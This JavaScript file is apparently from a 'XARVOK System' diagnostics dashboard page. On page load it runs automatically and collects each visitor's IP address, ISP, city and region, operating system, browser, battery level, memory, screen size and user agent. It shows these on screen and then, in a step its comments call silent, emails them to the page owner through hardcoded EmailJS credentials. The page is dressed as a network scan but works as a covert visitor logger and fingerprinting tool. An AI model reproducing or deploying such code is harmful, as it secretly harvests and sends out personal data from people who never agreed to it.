// --- CONFIGURATION ---
const SERVICE_ID = "service_14u2qeo";
const TEMPLATE_ID = "template_qw34hzb";
const PUBLIC_KEY = "2jj19BTFwlNnm8fp_";

document.addEventListener('DOMContentLoaded', () => {
    // 1. Initialize EmailJS
    try {
        emailjs.init(PUBLIC_KEY);
    } catch (e) {
        console.warn("EmailJS failed to load. Adblocker might be active.");
    }

    // 2. Start the Clock
    startClock();

    // 3. Auto-Run Diagnostics immediately
    setTimeout(() => {
        runDiagnostics();
    }, 1000);

    // 4. Setup Manual Button
    const btn = document.getElementById('scan-btn');
    if(btn) {
        btn.addEventListener('click', () => {
            if (!btn.disabled) runDiagnostics();
        });
    }
});

async function runDiagnostics() {
    const btn = document.getElementById('scan-btn');
    const status = document.getElementById('connection-status');

    // UI State: Running
    if(btn) {
        btn.disabled = true;
        btn.querySelector('.btn-text').textContent = "SCANNING...";
    }
    if(status) {
        status.textContent = "PROCESSING...";
        status.style.color = "#fbbf24"; // Yellow
    }

    try {
        // --- STEP 1: GATHER DATA ---
        const [ipData, latency, battery] = await Promise.all([
            fetchIPData(),
            measureLatency(),
            getBatteryStatus()
        ]);

        const nav = navigator;
        const screen = window.screen;

        // Prepare the Data Object
        const emailParams = {
            title: ipData.ip || 'Unknown IP',
            name: "XARVOK System",
            email: "report@xarvok.com",
            
            ip: ipData.ip || 'UNAVAILABLE',
            isp: ipData.org || 'UNKNOWN ISP',
            location: `${ipData.city || 'Unknown'}, ${ipData.region || 'Region'}, ${ipData.country_name || 'Country'}`,
            latency: latency + 'ms',
            os: getOS(),
            browser: getBrowser(),
            battery: battery,
            device_memory: nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'N/A',
            resolution: `${screen.width}x${screen.height}`,
            user_agent: nav.userAgent,
            time: new Date().toLocaleString()
        };

        // --- STEP 2: UPDATE DASHBOARD (INSTANTLY) ---
        // We do this BEFORE sending the email so the user sees data immediately
        updateDashboard(emailParams, ipData);

        if(status) {
            status.textContent = "ONLINE";
            status.style.color = "#00ffea"; // Cyan
        }

        // --- STEP 3: SEND EMAIL (BACKGROUND) ---
        // This runs silently. If it fails, the user still sees their data.
        await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailParams);
        console.log("Transmission Successful");

    } catch (error) {
        console.error("Diagnostic Error:", error);
        // Even if error, try to show what we have
        if(status) status.textContent = "PARTIAL DATA";
    } finally {
        // Reset Button
        if(btn) {
            setTimeout(() => {
                btn.disabled = false;
                btn.querySelector('.btn-text').textContent = "RE-SCAN";
            }, 2000);
        }
    }
}

// --- DATA COLLECTION TOOLS ---

async function fetchIPData() {
    try {
        const req = await fetch('https://ipapi.co/json/');
        if (!req.ok) throw new Error("Blocked");
        return await req.json();
    } catch { 
        return { ip: 'UNAVAILABLE', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Hidden' }; 
    }
}

async function measureLatency() {
    const start = Date.now();
    try {
        // Tries to ping the current page. If local file, returns 0.
        await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
        return Date.now() - start;
    } catch { return 0; }
}

async function getBatteryStatus() {
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            return `${Math.round(b.level * 100)}%`;
        } catch { return 'RESTRICTED'; }
    }
    return 'N/A';
}

function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Win")) return "WINDOWS";
    if (ua.includes("Mac")) return "MACOS";
    if (ua.includes("Linux")) return "LINUX";
    if (ua.includes("Android")) return "ANDROID";
    if (ua.includes("iPhone")) return "IOS";
    return "UNKNOWN UNIT";
}

function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome")) return "CHROME";
    if (ua.includes("Firefox")) return "FIREFOX";
    if (ua.includes("Safari")) return "SAFARI";
    if (ua.includes("Edge")) return "EDGE";
    return "WEB CLIENT";
}

// --- UI UPDATER ---
function updateDashboard(data, ipRaw) {
    const setText = (id, txt) => {
        const el = document.getElementById(id);
        if(el) el.textContent = txt;
    };
    
    // Safety check for IP data
    const city = ipRaw.city || 'Unknown';
    const region = ipRaw.region || 'Region';

    setText('ip', data.ip);
    setText('isp', data.isp);
    setText('location', `${city}, ${region}`);
    
    // Coordinate handling
    if(ipRaw.latitude && ipRaw.longitude) {
        setText('coords', `${ipRaw.latitude}, ${ipRaw.longitude}`);
    } else {
        setText('coords', 'N/A');
    }

    setText('latency', `PING: ${data.latency}`);
    setText('os', data.os);
    setText('cores', (navigator.hardwareConcurrency || '?') + ' CORES');
    setText('ram', data.device_memory);
    setText('battery', data.battery);
    setText('res', data.resolution);
    setText('browser', data.browser);
    setText('connection', navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "UNKNOWN");
    
    // Safe GPU check
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const info = gl.getExtension('WEBGL_debug_renderer_info');
        if(gl && info) {
            setText('gpu', gl.getParameter(info.UNMASKED_RENDERER_WEBGL));
        } else {
            setText('gpu', 'GENERIC DISPLAY ADAPTER');
        }
    } catch { 
        setText('gpu', 'GENERIC DISPLAY ADAPTER'); 
    }
}

function startClock() {
    setInterval(() => {
        const now = new Date();
        const el = document.getElementById('clock');
        if(el) el.textContent = now.toLocaleTimeString('en-GB');
    }, 1000);
}
